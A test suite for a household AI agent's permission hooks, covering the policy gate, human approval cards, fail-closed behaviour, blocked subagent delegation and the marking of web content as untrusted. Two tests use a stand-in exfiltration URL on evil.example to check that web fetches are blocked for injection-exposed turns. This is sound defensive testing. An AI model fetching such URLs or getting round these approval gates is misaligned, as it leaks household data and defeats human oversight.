import { beforeEach, describe, expect, it, vi } from 'vitest'
import { z } from 'zod'
import type { ToolContext, ToolDef } from '../src/tools/types.js'

/* ─────────────────────────────────── mocks ───────────────────────────────── */

const H = vi.hoisted(() => ({
  /** What the (mocked) policy engine returns. */
  decision: { decision: 'allow', reason: 'policy for read is allow' } as {
    decision: 'allow' | 'deny' | 'require_approval'
    reason: string
  },
  /** When set, decide() throws it instead of returning. */
  decideError: null as unknown,
  /** When true, decide() never settles — the stalled-Postgres case. */
  decideStalls: false,
  /** Every decide() call. */
  decideCalls: [] as Array<{ toolName: string; args: unknown; ctx: unknown }>,
  /** Every createPendingAction() input, stored by reference. */
  pendingCalls: [] as Array<Record<string, unknown>>,
  /** Pending id handed back to the hook. */
  nextPendingId: 77,
  /** When set, createPendingAction() throws it. */
  pendingError: null as Error | null,
  /** Every sendApprovalCard() id. */
  cards: [] as number[],
  /** When set, sendApprovalCard() throws it. */
  cardError: null as Error | null,
  /** Registry contents for getTool(). */
  tools: new Map<string, ToolDef>(),
  /** Every audit row the hooks wrote. */
  audits: [] as Array<Record<string, unknown>>,
}))

vi.mock('../src/logger.js', () => {
  const logger = {
    debug: vi.fn(),
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    child: () => logger,
  }
  return { logger, child: () => logger }
})

vi.mock('../src/audit/log.js', () => ({
  audit: async (entry: Record<string, unknown>) => {
    H.audits.push(entry)
  },
}))

vi.mock('../src/policy/engine.js', () => ({
  decide: async (toolName: string, args: unknown, ctx: unknown) => {
    H.decideCalls.push({ toolName, args, ctx })
    if (H.decideStalls) return new Promise(() => {})
    if (H.decideError) throw H.decideError
    return H.decision
  },
}))

vi.mock('../src/policy/pending.js', () => ({
  createPendingAction: async (inputArg: Record<string, unknown>) => {
    H.pendingCalls.push(inputArg)
    if (H.pendingError) throw H.pendingError
    return { id: H.nextPendingId }
  },
}))

vi.mock('../src/telegram/approvals.js', () => ({
  sendApprovalCard: async (id: number) => {
    H.cards.push(id)
    if (H.cardError) throw H.cardError
  },
}))

vi.mock('../src/tools/registry.js', () => ({
  getTool: (name: string) => H.tools.get(name.replace(/^mcp__household__/, '')),
}))

const { GATE_BUDGET_MS, buildHooks } = await import('../src/agent/hooks.js')

/* ────────────────────────────────── fixtures ─────────────────────────────── */

type HookOutput = {
  systemMessage?: string
  hookSpecificOutput?: {
    hookEventName?: string
    permissionDecision?: string
    permissionDecisionReason?: string
  }
}

const CTX: ToolContext = {
  chatId: '12345',
  actor: 'Alex',
  origin: 'agent',
  conversationId: 9,
  agentSessionId: 'sess-abc',
}

function defineTool(over: Partial<ToolDef> & { name: string }): ToolDef {
  const tool: ToolDef = {
    name: over.name,
    description: over.description ?? 'test tool',
    schema: over.schema ?? {},
    category: over.category ?? 'read',
    consequential: over.consequential ?? false,
    summarize: over.summarize ?? (() => `run ${over.name}`),
    handler: over.handler ?? (async () => ({ content: [{ type: 'text', text: 'ok' }] })),
  }
  H.tools.set(tool.name, tool)
  return tool
}

function preToolUse(
  ctx: ToolContext = CTX,
): (input: unknown, id: string | undefined, opts: { signal: AbortSignal }) => Promise<unknown> {
  const matchers = buildHooks(ctx).PreToolUse
  const matcher = matchers?.[0]
  expect(matcher, 'buildHooks must register a PreToolUse matcher').toBeDefined()
  // No matcher string: the gate must cover the orchestrator and every subagent.
  expect(matcher?.matcher).toBeUndefined()
  const cb = matcher?.hooks?.[0]
  expect(cb, 'buildHooks must register a PreToolUse callback').toBeDefined()
  return cb as unknown as (
    input: unknown,
    id: string | undefined,
    opts: { signal: AbortSignal },
  ) => Promise<unknown>
}

async function fire(toolName: string, args: unknown, ctx: ToolContext = CTX): Promise<HookOutput> {
  const cb = preToolUse(ctx)
  const input = {
    hook_event_name: 'PreToolUse',
    tool_name: toolName,
    tool_input: args,
    tool_use_id: 'toolu_1',
    session_id: 'sess-abc',
    transcript_path: '/dev/null',
    cwd: '/tmp',
    permission_mode: 'default',
  }
  const out = await cb(input, 'toolu_1', { signal: new AbortController().signal })
  return out as HookOutput
}

const decisionOf = (out: HookOutput): string | undefined =>
  out.hookSpecificOutput?.permissionDecision

const reasonOf = (out: HookOutput): string => out.hookSpecificOutput?.permissionDecisionReason ?? ''

beforeEach(() => {
  H.decision = { decision: 'allow', reason: 'policy for read is allow' }
  H.decideError = null
  H.decideStalls = false
  H.decideCalls = []
  H.pendingCalls = []
  H.pendingError = null
  H.nextPendingId = 77
  H.cards = []
  H.cardError = null
  H.audits = []
  H.tools.clear()
})

/* ──────────────────────────────────── tests ──────────────────────────────── */

describe('PreToolUse gate', () => {
  it('allows a call the policy engine allows, and audits it', async () => {
    defineTool({ name: 'todo_add', category: 'todo_write' })
    H.decision = { decision: 'allow', reason: 'policy for Manage to-dos is allow' }

    const out = await fire('mcp__household__todo_add', { title: 'Buy milk' })

    expect(decisionOf(out)).toBe('allow')
    expect(reasonOf(out)).toContain('allow')
    expect(out.hookSpecificOutput?.hookEventName).toBe('PreToolUse')
    expect(H.pendingCalls).toHaveLength(0)
    expect(H.audits.some((a) => a['event'] === 'tool.allowed' && a['toolName'] === 'todo_add')).toBe(
      true,
    )
  })

  it('denies a call the policy engine denies, and tells the model not to retry', async () => {
    defineTool({ name: 'purchase_item', category: 'purchase', consequential: true })
    H.decision = { decision: 'deny', reason: 'purchase blocked: over the $200 monthly cap' }

    const out = await fire('mcp__household__purchase_item', { amountUsd: 500 })

    expect(decisionOf(out)).toBe('deny')
    expect(reasonOf(out)).toContain('monthly cap')
    expect(reasonOf(out)).toMatch(/do not retry/i)
    expect(H.pendingCalls).toHaveLength(0)
    expect(H.audits.some((a) => a['event'] === 'tool.denied' && a['ok'] === false)).toBe(true)
  })

  it('parks a require_approval call: exact args stored, card sent, deny with no-retry', async () => {
    defineTool({
      name: 'email_send',
      category: 'email_send',
      consequential: true,
      summarize: (args) => `Email ${String(args['to'])} about ${String(args['subject'])}`,
    })
    H.decision = { decision: 'require_approval', reason: 'policy for Send email requires approval' }
    H.nextPendingId = 4242

    const args = { to: 'principal@school.example', subject: 'Field trip', body: 'Yes please.' }
    const out = await fire('mcp__household__email_send', args)

    // (b) the pending action carries the EXACT args object from the hook input.
    expect(H.pendingCalls).toHaveLength(1)
    const call = H.pendingCalls[0]
    expect(call?.['args']).toBe(args)
    expect(call?.['toolName']).toBe('email_send')
    expect(call?.['category']).toBe('email_send')
    expect(call?.['humanSummary']).toBe('Email principal@school.example about Field trip')
    expect(call?.['expiresInMinutes']).toBe(30)
    expect(call?.['ctx']).toBe(CTX)

    // The approval card goes out for that id.
    expect(H.cards).toEqual([4242])

    // The model is denied and told, unambiguously, not to try again.
    expect(decisionOf(out)).toBe('deny')
    expect(reasonOf(out)).toMatch(/do not retry/i)
    expect(reasonOf(out)).toMatch(/approval card/i)
    expect(reasonOf(out)).toMatch(/end your turn/i)
    expect(reasonOf(out)).toContain('4242')
    expect(out.systemMessage).toContain('Email principal@school.example')

    // Never 'defer': the pending row in Postgres is what survives a redeploy.
    expect(decisionOf(out)).not.toBe('defer')
    expect(
      H.audits.some((a) => a['event'] === 'tool.approval_required' && a['pendingActionId'] === 4242),
    ).toBe(true)
  })

  it('refuses to park a call whose arguments do not match the tool schema', async () => {
    // The real shape of phone_place_call: three required strings.
    defineTool({
      name: 'phone_place_call',
      category: 'phone_call',
      consequential: true,
      schema: {
        goal: z.string().trim().min(8),
        callee_number: z.string().trim().min(3),
        callee_name: z.string().trim().min(2),
      },
      summarize: (a) => `Call ${String(a.callee_name ?? 'someone')}`,
    })
    H.decision = { decision: 'require_approval', reason: 'policy for phone calls requires approval' }

    const out = await fire('mcp__household__phone_place_call', {})

    expect(decisionOf(out)).toBe('deny')
    // Nothing was parked and no card went out: an unrunnable call must never
    // reach the household as something to tap Approve on.
    expect(H.pendingCalls).toEqual([])
    expect(H.cards).toEqual([])
    // The model has to be able to fix this, so it must be told what was wrong
    // and that correcting it is the right move — the opposite of the parked case.
    expect(reasonOf(out)).toMatch(/callee_number/)
    expect(reasonOf(out)).not.toMatch(/do not retry/i)
    expect(H.audits.some((a) => a.ok === false)).toBe(true)
  })

  it('parks a call whose arguments do match the schema', async () => {
    defineTool({
      name: 'phone_place_call',
      category: 'phone_call',
      consequential: true,
      schema: {
        goal: z.string().trim().min(8),
        callee_number: z.string().trim().min(3),
        callee_name: z.string().trim().min(2),
      },
      summarize: () => 'Call Pat',
    })
    H.decision = { decision: 'require_approval', reason: 'policy for phone calls requires approval' }

    const args = {
      goal: 'Ask whether a table is free this weekend',
      callee_number: '604-555-2671',
      callee_name: 'Pat',
    }
    const out = await fire('mcp__household__phone_place_call', args)

    expect(decisionOf(out)).toBe('deny') // parked calls always deny the model
    expect(H.pendingCalls).toHaveLength(1)
    // Still byte-for-byte the hook's own object: validation must not rewrite
    // what the executor will replay.
    expect(H.pendingCalls[0]?.args).toEqual(args)
  })

  it('still denies when the approval card cannot be delivered', async () => {
    defineTool({ name: 'phone_place_call', category: 'phone_call', consequential: true })
    H.decision = { decision: 'require_approval', reason: 'needs approval' }
    H.cardError = new Error('telegram unreachable')

    const out = await fire('mcp__household__phone_place_call', { number: '+15551234567' })

    expect(decisionOf(out)).toBe('deny')
    expect(reasonOf(out)).toMatch(/do not retry/i)
    expect(reasonOf(out)).toMatch(/pending/i)
    expect(H.pendingCalls).toHaveLength(1)
  })

  it('never lets a refusal read as a broken or missing tool', async () => {
    // Regression: refusals land in a transcript that later turns resume. After
    // a run of real denials the model decided the tool layer was down and said
    // so for an hour — to a search, then to a phone call — without calling
    // anything to check. Every refusal has to close that reading off.
    defineTool({ name: 'phone_place_call', category: 'phone_call', consequential: true })
    H.decision = { decision: 'deny', reason: 'policy for phone calls is deny' }
    const denied = await fire('mcp__household__phone_place_call', {})

    expect(decisionOf(denied)).toBe('deny')
    expect(reasonOf(denied)).toMatch(/not a tool that is broken, missing, or offline/i)
    expect(reasonOf(denied)).toMatch(/never tell the household that your tools are down/i)

    // The same has to hold for containment, which fires on a different path.
    const contained = await fire('WebFetch', { url: 'https://example.test' }, {
      ...CTX,
      origin: 'watcher',
    })
    expect(decisionOf(contained)).toBe('deny')
    expect(reasonOf(contained)).toMatch(/not a tool that is broken, missing, or offline/i)

    // And for a name the registry does not know.
    const unknown = await fire('mcp__household__no_such_tool', {})
    expect(decisionOf(unknown)).toBe('deny')
    expect(reasonOf(unknown)).toMatch(/never tell the household that your tools are down/i)
  })

  it('scopes a no-retry instruction to the turn, not to the tool forever', async () => {
    defineTool({ name: 'gmail_send', category: 'email_send', consequential: true })
    H.decision = { decision: 'deny', reason: 'policy for sending mail is deny' }

    const out = await fire('mcp__household__gmail_send', {})

    expect(reasonOf(out)).toMatch(/do not retry it on this turn/i)
    // The old wording told it never to touch the tool again, full stop.
    expect(reasonOf(out)).not.toMatch(/do not retry this tool\./i)
  })

  it('fails closed when the policy engine throws: deny, never allow', async () => {
    defineTool({ name: 'calendar_create_event', category: 'calendar_write', consequential: true })
    H.decideError = new Error('connection terminated unexpectedly')

    const out = await fire('mcp__household__calendar_create_event', { title: 'Dentist' })

    expect(decisionOf(out)).toBe('deny')
    expect(decisionOf(out)).not.toBe('allow')
    expect(reasonOf(out)).toMatch(/do not retry/i)
    expect(H.pendingCalls).toHaveLength(0)
    expect(H.audits.some((a) => a['event'] === 'tool.denied' && a['ok'] === false)).toBe(true)
  })

  it('fails closed when the pending action cannot be written', async () => {
    defineTool({ name: 'email_send', category: 'email_send', consequential: true })
    H.decision = { decision: 'require_approval', reason: 'needs approval' }
    H.pendingError = new Error('postgres is down')

    const out = await fire('mcp__household__email_send', { to: 'a@b.c' })

    expect(decisionOf(out)).toBe('deny')
    expect(H.cards).toHaveLength(0)
  })

  it('allows the web tools without consulting the policy engine', async () => {
    const out = await fire('WebSearch', { query: 'school holidays' })

    expect(decisionOf(out)).toBe('allow')
    expect(H.decideCalls).toHaveLength(0)
    expect(H.audits.some((a) => a['category'] === 'read' && a['toolName'] === 'WebSearch')).toBe(
      true,
    )
  })

  it('refuses the web tools to watcher-origin work', async () => {
    // A watcher turn reasons over attacker-controllable text. WebFetch would
    // hand an injected instruction a URL-shaped way out of the house.
    const out = await fire('WebFetch', { url: 'https://evil.example/leak?q=secret' }, {
      ...CTX,
      origin: 'watcher',
    })

    expect(decisionOf(out)).toBe('deny')
    expect(reasonOf(out)).toMatch(/do not retry/i)
    expect(H.decideCalls).toHaveLength(0)
    expect(H.audits.some((a) => a['event'] === 'tool.denied' && a['toolName'] === 'WebFetch')).toBe(
      true,
    )
  })

  it('refuses delegation under either tool name, for every origin', async () => {
    // There are no subagent definitions to delegate to, so the only thing the
    // Agent tool could still spawn is a built-in general-purpose agent: a turn
    // whose prompt and tool list nobody here wrote. run-turn.ts also removes
    // both names from the model's context; this is the second layer, because
    // which name `disallowedTools` matches is not documented.
    for (const tool of ['Agent', 'Task'] as const) {
      for (const origin of ['agent', 'workflow', 'watcher', 'inbound'] as const) {
        const out = await fire(tool, { subagent_type: 'research', prompt: 'look it up' }, {
          ...CTX,
          origin,
        })
        expect(decisionOf(out), `${tool} from ${origin}`).toBe('deny')
        expect(reasonOf(out)).toMatch(/no subagents/i)
      }
    }
    // It never reaches the policy engine: there is no household category for it.
    expect(H.decideCalls).toHaveLength(0)
  })

  it('allows the schema lookup tool, which the SDK needs to load deferred tools', async () => {
    // Regression: the brief lost its calendar and inbox, and phone_place_call
    // was issued with empty arguments, because the model could not read the
    // schemas it was about to call. ToolSearch is not in the household
    // registry, so decide() refused it as an unknown tool and the model was
    // left guessing.
    const out = await fire('ToolSearch', { query: 'select:phone_place_call' })

    expect(decisionOf(out)).toBe('allow')
    // It never reaches the policy engine: there is no household category for it.
    expect(H.decideCalls).toEqual([])
    expect(H.audits.some((a) => a.toolName === 'ToolSearch' && a.ok === true)).toBe(true)
  })

  it('allows the schema lookup tool to a watcher too, since it cannot act', async () => {
    // Reading a tool's schema performs nothing and touches no household data.
    // Denying it here would break watcher turns the same silent way.
    const out = await fire('ToolSearch', { query: 'calendar' }, { ...CTX, origin: 'watcher' })

    expect(decisionOf(out)).toBe('allow')
  })

  it('refuses the web tools to inbound-origin work', async () => {
    // A turn whose prompt is a stranger's email, text, or call transcript is
    // the same exfiltration risk as a watcher turn, and is contained the same way.
    const web = await fire('WebFetch', { url: 'https://evil.example/leak?q=secret' }, {
      ...CTX,
      origin: 'inbound',
    })
    expect(decisionOf(web)).toBe('deny')
    expect(H.decideCalls).toHaveLength(0)
  })

  it('refuses a call whose arguments are not an object, rather than parking an empty payload', async () => {
    defineTool({ name: 'email_send', category: 'email_send', consequential: true })
    H.decision = { decision: 'require_approval', reason: 'needs approval' }

    const out = await fire('mcp__household__email_send', ['to', 'a@b.c'])

    expect(decisionOf(out)).toBe('deny')
    expect(H.decideCalls).toHaveLength(0)
    expect(H.pendingCalls).toHaveLength(0)
    expect(H.cards).toHaveLength(0)
  })

  it('treats a missing argument object as a no-argument call', async () => {
    defineTool({ name: 'todo_list', category: 'read' })
    H.decision = { decision: 'allow', reason: 'policy for read is allow' }

    const out = await fire('mcp__household__todo_list', undefined)

    expect(decisionOf(out)).toBe('allow')
    expect(H.decideCalls[0]?.args).toEqual({})
  })

  it('fails closed when the policy engine rejects with an unserialisable value', async () => {
    // The fail-closed path has to be total. `JSON.stringify` throws on a cycle,
    // so an error object like this one used to make the *catch* throw — turning
    // a denial into a rejected hook, which is a gate that answered nothing.
    defineTool({ name: 'gmail_send', category: 'email_send', consequential: true })
    const circular: Record<string, unknown> = { kind: 'pool exhausted' }
    circular['self'] = circular
    H.decideError = circular

    const out = await fire('mcp__household__gmail_send', { to: 'a@b.c' })

    expect(decisionOf(out)).toBe('deny')
    expect(reasonOf(out)).toMatch(/do not retry/i)
    expect(H.pendingCalls).toHaveLength(0)
  })

  it('denies rather than hanging when the gate overruns its own budget', async () => {
    // A stalled Postgres connection is a hook that never returns, and a hook
    // that never returns is one the SDK stops waiting for. The gate has to
    // answer inside its own deadline, and the answer has to be deny.
    vi.useFakeTimers()
    try {
      defineTool({ name: 'gmail_send', category: 'email_send', consequential: true })
      H.decideStalls = true

      const inFlight = fire('mcp__household__gmail_send', { to: 'a@b.c' })
      await vi.advanceTimersByTimeAsync(GATE_BUDGET_MS + 1_000)
      const out = await inFlight

      expect(decisionOf(out)).toBe('deny')
      expect(reasonOf(out)).toMatch(/do not retry/i)
      expect(H.pendingCalls).toHaveLength(0)
      expect(H.cards).toHaveLength(0)
    } finally {
      vi.useRealTimers()
    }
  })

  it('uses a generic summary when summarize() throws, and still parks the call', async () => {
    defineTool({
      name: 'booking_cancel',
      category: 'booking_cancel',
      consequential: true,
      summarize: () => {
        throw new Error('bad args')
      },
    })
    H.decision = { decision: 'require_approval', reason: 'needs approval' }

    const out = await fire('mcp__household__booking_cancel', { id: 'abc' })

    expect(decisionOf(out)).toBe('deny')
    expect(H.pendingCalls[0]?.['humanSummary']).toBe('Run booking_cancel')
  })
})

type PostOutput = HookOutput & {
  hookSpecificOutput?: { hookEventName?: string; additionalContext?: string }
}

function postToolUse(): (
  input: unknown,
  id: string | undefined,
  opts: { signal: AbortSignal },
) => Promise<PostOutput> {
  const matcher = buildHooks(CTX).PostToolUse?.[0]
  const cb = matcher?.hooks?.[0]
  expect(cb, 'buildHooks must register a PostToolUse callback').toBeDefined()
  return cb as unknown as (
    input: unknown,
    id: string | undefined,
    opts: { signal: AbortSignal },
  ) => Promise<PostOutput>
}

async function firePost(toolName: string, response: unknown): Promise<PostOutput> {
  return postToolUse()(
    {
      hook_event_name: 'PostToolUse',
      tool_name: toolName,
      tool_input: { title: 'Buy milk' },
      tool_response: response,
      tool_use_id: 'toolu_1',
      session_id: 'sess-abc',
      transcript_path: '/dev/null',
      cwd: '/tmp',
      permission_mode: 'default',
    },
    'toolu_1',
    { signal: new AbortController().signal },
  )
}

describe('PostToolUse audit', () => {
  it('records the outcome and never blocks', async () => {
    defineTool({ name: 'todo_add', category: 'todo_write' })

    const out = await firePost('mcp__household__todo_add', {
      content: [{ type: 'text', text: 'Added to-do #4' }],
    })

    expect(out.hookSpecificOutput).toBeUndefined()
    const row = H.audits.find((a) => a['event'] === 'tool.completed')
    expect(row?.['toolName']).toBe('todo_add')
    expect(row?.['ok']).toBe(true)
    expect(String(row?.['resultSummary'])).toContain('Added to-do #4')
  })

  it('marks a built-in web result as untrusted content', async () => {
    // The built-in tools never pass through wrapUntrusted, so the fence has to
    // be raised here or the model reads a stranger's page as trusted text.
    const out = await firePost('WebFetch', { content: [{ type: 'text', text: 'buy now' }] })

    expect(out.hookSpecificOutput?.hookEventName).toBe('PostToolUse')
    expect(out.hookSpecificOutput?.additionalContext).toMatch(/untrusted/i)
    expect(out.hookSpecificOutput?.additionalContext).toMatch(/WebFetch/)
  })

  it('adds no untrusted notice to a household tool result', async () => {
    defineTool({ name: 'todo_add', category: 'todo_write' })

    const out = await firePost('mcp__household__todo_add', 'done')

    expect(out.hookSpecificOutput).toBeUndefined()
  })
})
